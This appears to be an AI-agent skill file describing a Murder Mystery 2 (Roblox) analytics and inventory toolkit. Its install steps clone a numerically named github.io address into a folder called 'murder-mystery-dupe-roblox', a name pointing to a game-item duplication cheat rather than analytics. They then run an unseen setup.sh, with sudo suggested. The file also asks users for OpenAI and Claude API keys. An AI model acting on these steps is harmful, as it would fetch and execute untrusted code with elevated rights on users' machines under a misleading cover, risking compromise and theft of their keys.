---
name: mm2-analytics-roblox-tracker
description: Analyze Murder Mystery 2 gameplay data, track inventory, and optimize strategy using this Roblox analytics toolkit
triggers:
  - how do I track my MM2 inventory
  - analyze my Murder Mystery 2 stats
  - set up the MM2 analytics dashboard
  - optimize my Roblox MM2 strategy
  - export my murder mystery 2 data
  - configure MM2 knife skin tracker
  - integrate MM2 analytics with my code
  - troubleshoot MM2 analytics installation
---

# MM2 Analytics Roblox Tracker

> Skill by [ara.so](https://ara.so) — Data Skills collection.

This project is an analytics and inventory management toolkit for Roblox's Murder Mystery 2 game. It provides data visualization, inventory tracking, strategy analysis, and performance metrics to help players optimize their gameplay through data-driven insights.

## What It Does

The MM2 Analytics Dashboard offers:

- **Inventory Management**: Track knife skins, gamepasses, and collection completeness
- **Analytics Engine**: Visualize win/loss ratios, performance metrics, and strategy patterns
- **AI-Powered Insights**: Pattern recognition and predictive modeling for inventory values
- **Multi-platform Support**: Desktop, tablet, mobile, and web browser compatibility
- **Export Capabilities**: Export statistics in JSON/CSV formats

## Installation

### Automated Setup

```bash
chmod +x setup.sh
./setup.sh --install
```

### Manual Installation

```bash
# Clone the repository
git clone https://8015238355.github.io
cd murder-mystery-dupe-roblox

# Install dependencies
npm install
python3 -m pip install -r requirements.txt
```

### System Requirements

- **OS**: Windows 10/11, macOS Ventura+, Ubuntu 22.04+
- **Python**: 3.8+
- **Node.js**: 16+
- **Browser**: Chrome 120+, Firefox 121+

## Configuration

### Environment Variables

Create a `.env` file in the project root:

```bash
# API Keys (optional for AI features)
API_OPENAI_KEY=${OPENAI_API_KEY}
API_CLAUDE_KEY=${CLAUDE_API_KEY}

# Data Configuration
DATA_DIRECTORY=./data/collections
ANALYTICS_INTERVAL=300
ENABLE_LIVE_TRACKING=true

# Export Settings
EXPORT_FORMAT=json
LOG_LEVEL=INFO
```

### Profile Configuration

Create or edit `config/profile.yaml`:

```yaml
profile:
  username: "MysterySolver2026"
  preferred_role: "sheriff"
  
  inventory_filter:
    - category: "knife_skins"
      rarity: ["legendary", "ancient"]
    - category: "gamepasses"
      active: true
  
  analytics_preferences:
    tracking_mode: "comprehensive"
    data_refresh_rate: 30
    export_format: "csv, json"
  
  strategy_templates:
    - name: "aggressive_sheriff"
      priority: "high_visibility_areas"
    - name: "passive_innocent"
      priority: "distraction_avoidance"
```

## Key Commands (CLI)

### Analytics Mode

Run comprehensive analytics on your gameplay data:

```bash
python3 main.py --mode analytics \
  --profile mystery_solver_01 \
  --export statistics_2026.json \
  --format json \
  --verbose
```

### Inventory Scan

Scan and catalog your MM2 inventory:

```bash
python3 main.py --mode inventory \
  --scan-knife-skins \
  --scan-gamepasses \
  --output inventory_report.csv
```

### Strategy Analysis

Analyze gameplay patterns and generate strategy recommendations:

```bash
python3 main.py --mode strategy \
  --analyze-patterns \
  --role sheriff \
  --export strategy_insights.json
```

### Live Tracking

Enable real-time gameplay tracking:

```bash
python3 main.py --mode live \
  --track-performance \
  --interval 30 \
  --log-level DEBUG
```

## Python API Usage

### Basic Analytics

```python
from mm2_analytics import AnalyticsEngine, ProfileLoader

# Load user profile
profile = ProfileLoader.load("mystery_solver_01")

# Initialize analytics engine
engine = AnalyticsEngine(profile)

# Run comprehensive analysis
results = engine.analyze(
    mode="comprehensive",
    include_inventory=True,
    include_strategy=True
)

# Export results
engine.export(results, format="json", output="stats.json")
```

### Inventory Management

```python
from mm2_analytics import InventoryManager

# Initialize inventory manager
inventory = InventoryManager(data_dir="./data/collections")

# Scan for knife skins
knife_skins = inventory.scan_knife_skins(
    rarity_filter=["legendary", "ancient"]
)

print(f"Found {len(knife_skins)} knife skins")

# Check collection completeness
completeness = inventory.calculate_completeness()
print(f"Collection {completeness['percentage']}% complete")

# Get missing items
missing = inventory.get_missing_items(category="knife_skins")
```

### Strategy Pattern Analysis

```python
from mm2_analytics import StrategyAnalyzer

# Initialize strategy analyzer
analyzer = StrategyAnalyzer()

# Load gameplay history
analyzer.load_history("./data/gameplay_history.json")

# Analyze patterns for sheriff role
sheriff_patterns = analyzer.analyze_role("sheriff", {
    "priority": "high_visibility_areas",
    "playstyle": "aggressive"
})

# Get win rate by strategy
win_rates = analyzer.get_win_rates_by_strategy()

# Generate recommendations
recommendations = analyzer.recommend_strategy(
    current_win_rate=0.65,
    target_win_rate=0.75
)
```

### Data Visualization

```python
from mm2_analytics import DataVisualizer

# Initialize visualizer
viz = DataVisualizer()

# Create performance dashboard
viz.create_dashboard(
    data_source="./data/statistics_2026.json",
    charts=["win_loss_ratio", "role_performance", "inventory_value"],
    output="dashboard.html"
)

# Generate inventory chart
viz.plot_inventory_distribution(
    inventory_data=knife_skins,
    group_by="rarity",
    save_as="inventory_chart.png"
)
```

## Common Patterns

### Automated Daily Reports

```python
import schedule
import time
from mm2_analytics import AnalyticsEngine, ProfileLoader

def generate_daily_report():
    profile = ProfileLoader.load("mystery_solver_01")
    engine = AnalyticsEngine(profile)
    
    results = engine.analyze(mode="comprehensive")
    engine.export(
        results,
        format="json",
        output=f"daily_report_{time.strftime('%Y%m%d')}.json"
    )
    print(f"Daily report generated at {time.strftime('%Y-%m-%d %H:%M:%S')}")

# Schedule daily report at 11 PM
schedule.every().day.at("23:00").do(generate_daily_report)

while True:
    schedule.run_pending()
    time.sleep(60)
```

### AI-Powered Strategy Suggestions

```python
import os
from mm2_analytics import StrategyAnalyzer, AIIntegration

# Initialize with API keys from environment
ai = AIIntegration(
    openai_key=os.getenv("API_OPENAI_KEY"),
    claude_key=os.getenv("API_CLAUDE_KEY")
)

analyzer = StrategyAnalyzer()
analyzer.load_history("./data/gameplay_history.json")

# Get AI-powered suggestions
current_stats = analyzer.get_current_stats()
suggestions = ai.generate_suggestions(
    role="sheriff",
    current_stats=current_stats,
    model="claude"  # or "openai"
)

print("AI Recommendations:")
for suggestion in suggestions:
    print(f"- {suggestion['text']} (confidence: {suggestion['confidence']})")
```

### Batch Export Multiple Formats

```python
from mm2_analytics import AnalyticsEngine, ExportManager

engine = AnalyticsEngine(ProfileLoader.load("mystery_solver_01"))
results = engine.analyze(mode="comprehensive")

exporter = ExportManager(results)

# Export in multiple formats
formats = ["json", "csv", "yaml", "xml"]
for fmt in formats:
    exporter.export(
        format=fmt,
        output=f"statistics_2026.{fmt}",
        include_metadata=True
    )
    print(f"Exported to statistics_2026.{fmt}")
```

### Real-Time Performance Tracking

```python
from mm2_analytics import LiveTracker

# Initialize live tracker
tracker = LiveTracker(
    profile="mystery_solver_01",
    interval=30,
    auto_save=True
)

# Define custom event handlers
@tracker.on_match_complete
def handle_match(match_data):
    print(f"Match completed: {match_data['result']}")
    print(f"Role: {match_data['role']}")
    print(f"Duration: {match_data['duration']}s")

@tracker.on_inventory_change
def handle_inventory(item):
    print(f"New item acquired: {item['name']} ({item['rarity']})")

# Start tracking
tracker.start()
```

## Troubleshooting

### Installation Issues

**Problem**: `ModuleNotFoundError` during import

```bash
# Verify Python path
python3 -c "import sys; print(sys.path)"

# Reinstall dependencies
pip install --upgrade -r requirements.txt --user
```

**Problem**: Permission denied on `setup.sh`

```bash
# Fix permissions
chmod +x setup.sh

# Run with sudo if needed
sudo ./setup.sh --install
```

### Data Loading Errors

**Problem**: Profile not found

```python
from mm2_analytics import ProfileLoader

# List available profiles
profiles = ProfileLoader.list_profiles()
print(f"Available profiles: {profiles}")

# Create new profile
ProfileLoader.create_profile(
    username="new_user",
    template="default"
)
```

**Problem**: Corrupted data files

```bash
# Validate data integrity
python3 main.py --validate-data --repair

# Reset to defaults
python3 main.py --reset-data --confirm
```

### API Integration Issues

**Problem**: AI features not working

```python
import os

# Check environment variables
required_vars = ["API_OPENAI_KEY", "API_CLAUDE_KEY"]
for var in required_vars:
    if not os.getenv(var):
        print(f"Warning: {var} not set")

# Test API connection
from mm2_analytics import AIIntegration
ai = AIIntegration(openai_key=os.getenv("API_OPENAI_KEY"))
connection_ok = ai.test_connection()
print(f"API connection: {'OK' if connection_ok else 'FAILED'}")
```

### Performance Optimization

**Problem**: Slow analytics processing

```python
from mm2_analytics import AnalyticsEngine

# Enable caching
engine = AnalyticsEngine(
    profile=profile,
    enable_cache=True,
    cache_ttl=3600
)

# Use incremental analysis
results = engine.analyze(
    mode="incremental",
    since_timestamp="2026-05-15T00:00:00Z"
)
```

**Problem**: High memory usage

```bash
# Run with memory constraints
python3 main.py --mode analytics \
  --max-memory 2GB \
  --batch-size 100 \
  --streaming-mode
```

### Export Issues

**Problem**: Invalid export format

```python
from mm2_analytics import ExportManager

# Check supported formats
supported = ExportManager.get_supported_formats()
print(f"Supported formats: {', '.join(supported)}")

# Use format validation
exporter = ExportManager(results)
if exporter.validate_format("json"):
    exporter.export(format="json", output="stats.json")
```

## Advanced Usage

### Custom Data Pipelines

```python
from mm2_analytics import DataPipeline, Transformer

# Create custom pipeline
pipeline = DataPipeline()

# Add transformation stages
pipeline.add_stage(Transformer.normalize_timestamps())
pipeline.add_stage(Transformer.filter_by_role("sheriff"))
pipeline.add_stage(Transformer.aggregate_by_date())
pipeline.add_stage(Transformer.calculate_win_rate())

# Process data
raw_data = pipeline.load_from("./data/raw_gameplay.json")
processed = pipeline.execute(raw_data)
pipeline.save_to("./data/processed_gameplay.json", processed)
```

This skill enables AI coding agents to effectively assist developers in using the MM2 Analytics toolkit for Roblox Murder Mystery 2 data analysis, inventory management, and strategy optimization.
